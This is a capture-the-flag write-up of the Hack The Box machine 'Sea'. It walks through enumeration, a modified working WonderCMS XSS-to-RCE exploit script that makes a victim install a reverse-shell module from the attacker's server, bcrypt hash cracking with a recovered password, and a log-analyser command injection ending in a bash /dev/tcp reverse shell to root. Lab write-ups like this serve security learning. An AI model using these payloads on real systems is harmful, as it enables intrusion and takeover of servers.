#box #wondercms #XSS #internal-services #log-poisoning #RCE

>* Always aim to bring content from exploits inside our attack machine. If inside an exploit something refers an external link from the web to download stuff, always download the stuff on the attack machine first and then reference it on the exploit
>* Read carefully what the exploit does and debug it if necessary. Sometimes an exploit might be working but its implementation might not be adapt for our scenario.
>* Always opt to add comments at the end of an injection. Sometimes there might be some other commands preventing our Command Injection to work as expected
>* Compare the hashes provided with an example hash and then try to understand what's wrong by looking at the differences in characters
## Nmap

```bash
# Nmap 7.95 scan initiated Tue Sep  9 10:56:49 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.129.129.103
Nmap scan report for 10.129.129.103
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  9 10:56:58 2025 -- 1 IP address (1 host up) scanned in 9.18 seconds
```

## 80 - HTTP

On port 80 we discover a website. The website doesn't have a lot at the first sight except for a contact form in the page `How to Participate`. While trying to compile the form we notice the presence of a 'website' field. Maybe a hint for a XSS attack? Maybe that link is clicked by someone? Let's try to set up a NetCat listener and forward our URL to check whether someone is clicking it or not:

```bash
http://10.10.16.55:4444/ # The URL we input in the Website field of the Contact Form

# Listener
nc -vlnp 4444

# ..after a minute
connect to [10.10.16.55] from (UNKNOWN) [10.129.129.47] 39360
GET / HTTP/1.1
Host: 10.10.16.55:4444
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
```

Apparently someone is clicking that link. We might be able to obtain a XSS attack, but we first need to know more about the state of the application.

### Enumeration

We enumerate the website content and after some [[FFuF#Directory Fuzzing|enumeration]] we discover the presence of the following path: `http://sea.htb/themes/bike`

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://sea.htb/themes/FUZZ -c -ic -fc 403
```

Inside of that folder, we now enumerate for files (we first opt for the wordlist `quickhits.txt`):

>It's quite strange to find a `bike` folder, it seems a project-specific folder that may hide something more interesting. Also, by further enumerating this folder looking for older folders we didn't find anything

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://sea.htb/themes/bike/FUZZ -c -ic -fc 403

# discovering the following files
README.md               [Status: 200, Size: 318, Words: 40, Lines: 16, Duration: 53ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 28ms]
```

The version endpoint tells us a version number, `3.2.0` but we yet don't know what it refers to. But the README.md files confirms what the version is for, stating that the given website is running on `WonderCMS` a light-weight CMS for websites creation.
## CVE-2023-41425

By looking online, we discover the presence of a XSS to RCE vulnerability for the current version. The POC can be found [here](https://github.com/prodigiousMind/CVE-2023-41425/tree/main), however it requires some updates in order to make it work properly.
In minimal terms, the exploit consists in four phases:
* Generates a malicious URL that leverages a XSS vulnerability and targets the link opener to download a malicious `xss.js` file from our end
* Generates an `xss.js` files that requests the download of a zip file
* Unzip the zip file
* Locates the reverse shell location and triggers it

However, the script wasn't really well written for our purpose, so we delve in to change a few parameters:
* First, the `urlWithoutLogBase`. By keeping it this way, at the `urlRev` parameter it will send the request to download a shell at `//?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=` which is missing the domain name and the protocol in the URL.
* Instead of targeting the github URL we're gonna download the zip file on our end and then change the url to our web server
* We change `urlWithoutLogBase` and not only the reference in `urlRev` because `urlWithoutLogBase` is also used when making the request to get the reverse shell on the target (the effective action that will give us a shell)
Thus:
* `urlWithoutLogBase` becomes: `http://sea.htb`
* The rest of the `urlRev` becomes: `var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.16.55:8000/main.zip&directoryName=violet&type=themes&token=" + token;`

Finally, our script becomes:

```python
# Author: prodigiousMind
# Exploit: Wondercms 4.3.2 XSS to RCE


import sys
import requests
import os
import bs4

if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
else:
  data = '''
var url = "'''+str(sys.argv[1])+'''";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = "http://sea.htb"; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.16.55:8000/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "'''+str(sys.argv[2])+'''";
       var port = "'''+str(sys.argv[3])+'''";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();
       
     }
   };
 }
};
'''
  try:
    open("xss.js","w").write(data)
    print("[+] xss.js is created")
    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
    print("----------------------------\n")
    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
    XSSlink = XSSlink.strip(" ")
    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
    print("----------------------------\n")

    print("\nstarting HTTP server to allow the access to xss.js")
    os.system("python3 -m http.server\n")
  except: print(data,"\n","//write this to a file")
```

Now, we run the script with:

```bash
python3 prodMind.py http://sea.htb/loginURL 10.10.16.55 8080
```

The script will prompt us the command for the netcat listener and the link to be sent to another user to get a XSS:

```bash
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.16.55:8000/xss.js"></script><form+action="
```

We then go back on the contact form and insert this URL on the Website field of the form and Submit it.
We wait for a couple of minutes and we finally gain the shell.

## Foothold Reconnaissance

Inside `database.js` we discover a hashed password: `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`. By having no clue of what this password hash corresponds to, we opt to go on github on the [WonderCMS](https://github.com/WonderCMS/wondercms) project to discover how the password is built. We retrieve inside the `index.php` after search for `password` or `hash` we discover the presence of a PHP's `password_hash` function. This is an internal function from PHP reference [here](https://www.php.net/manual/en/function.password-hash.php). By default, it seems that PHP uses the `bcrypt` algorithm that should correspond to hashcat's mode 3200.
However, when trying to crack this specific password we discover that hashcat fails to crack it because the size of the password seems incorrect.
For comparison, we compare the length of the sample hash provided by hashcat with our one:

```bash
echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q' | wc -c # our hash
63

echo '$2a$05$LhayLxezLhK1LhWvKxCyLOj0j1u.Kj0jZ0pEmm134uzrQlFvQJLF6' | wc -c # hashcat sample
61
```

Something's off, we're two characters bigger but the documentation seems to tell that the hash shall be bcrypt. By looking closely, we notice how our hash seems to have some sort of escapes in it (inside the `database.js` file where we found that hash we also notice that also the dates are escaped). Thus we opt to remove the escape character `\` and proceed to crack it again succeding:

```bash
hashcat -m 3200 pass.txt /usr/share/wordlists/rockyou.txt
```

We now have a new password that we can use to authenticate in the website: `:mychemicalromance`.
What if...another use can authenticate with that password? We navigate inside the `/home` folder and notice the presence of 2 users, `amay` and `geo`. 
We try  `su amay` with this brand new password, achieving the user's flag. (we've also tried it on the other user but it didn't work)
## Privilege Escalation

We validate the presence of something running on port `8080`:

```bash
ss -lntp | awk '{print $4}'
Local
127.0.0.1:41121
127.0.0.1:8080
0.0.0.0:80
127.0.0.53%lo:53
0.0.0.0:22
[::]:22
```

We then opt to perform a Local Port Forwarding with SSH:

```bash
ssh -L 8080:localhost:8080 amay@sea.htb
```

And once authenticated in SSH we check what's now running on our port 8080 due to the port forwarding. We discover the presence of a monitoring application:

![[attachments/sea-writeup-1.png]]

By running `Analyze` we gain access to the content of the two files in the dropdown: `access.log` and `auth.log`. Nothing really important comes out from reading those two files.
However, we could try to perform a command injection attack by intercepting the API with Burp and manipulating the payload. Thus we turn on the burp web proxy and we intercept the api, receiveing:

```bash
POST / HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://localhost:8080
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://localhost:8080/
Cookie: ph_phc_hnhlqe6D2Q4IcQNrFItaqdXJAxQ8RcHkPAFAp74pubv_posthog=%7B%22distinct_id%22%3A%22ff8e12d4-c408-4f5f-a262-bdfb836db4c2%22%2C%22%24sesid%22%3A%5B1755884387647%2C%220198d2dc-01bf-78bb-819d-bda845ddbd07%22%2C1755884290495%5D%2C%22%24epp%22%3Atrue%7D; _gcl_au=1.1.467566071.1755884291; _ga_J69Z2JCTFB=GS2.1.s1755884291$o1$g1$t1755884387$j29$l0$h0; _ga=GA1.1.1787539965.1755884291; __hstc=181257784.c84eaa2ec229ec37634ef41de29a3f1e.1755884293176.1755884293176.1755884293176.1; hubspotutk=c84eaa2ec229ec37634ef41de29a3f1e; ajs_anonymous_id=3dd52b69-fe2b-4be7-8beb-e3f788711564
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=

```

We first try to access `%2fetc%2fpasswd`, succeeding and confirming we can probably get some code injection out of here. We then opt to combine different commands chained with `;`:

```bash
%2Fvar%2Flog%2Fapache2%2Faccess.log;id;
```

Without success.
Lately, we opt to add a comment symbol `#` at the end of the command (since the code being executed is bash code) to try comment out whatever comes after the command injection:

```
%2Fvar%2Flog%2Fapache2%2Faccess.log;id;#
```

Gaining effective command execution:

![[attachments/sea-writeup-2.png]]

We then opt for performing a reverse shell command injection by replacing id with a reverse shell:

```bash
%2Fvar%2Flog%2Fapache2%2Faccess.log;bash+-c+'/bin/bash+-i+>%26+/dev/tcp/10.10.16.55/4445+0>%261';#
```

Gaining root on the target machine.

## Post Exploitation

Why didn't the command injection work without the comment at the end?
That's because the given command is being ran inside a PHP code through `system`, precisely here:

```bash
$suspicious_traffic = system("cat $log_file | grep -i 'sql\|exec\|wget\|curl\|whoami\|system\|shell_exec\|ls\|dir'");
```

Now, without the comment the result would be:

```bash
$suspicious_traffic = system("cat %2Fvar%2Flog%2Fapache2%2Faccess.log;id; | grep -i 'sql\|exec\|wget\|curl\|whoami\|system\|shell_exec\|ls\|dir'");
```

Allowing the grep command piped after to be executed accordingly. Instead, with the comment sign right after, the command would look like this:

```bash
$suspicious_traffic = system("cat %2Fvar%2Flog%2Fapache2%2Faccess.log;id;# | grep -i 'sql\|exec\|wget\|curl\|whoami\|system\|shell_exec\|ls\|dir'");
cat %2Fvar%2Flog%2Fapache2%2Faccess.log;id;# | grep -i 'sql\|exec\|wget\|curl\|whoami\|system\|shell_exec\|ls\|dir' # extrapolating the bash version of `system` to make understand that the command excludes the grep that comes after
```
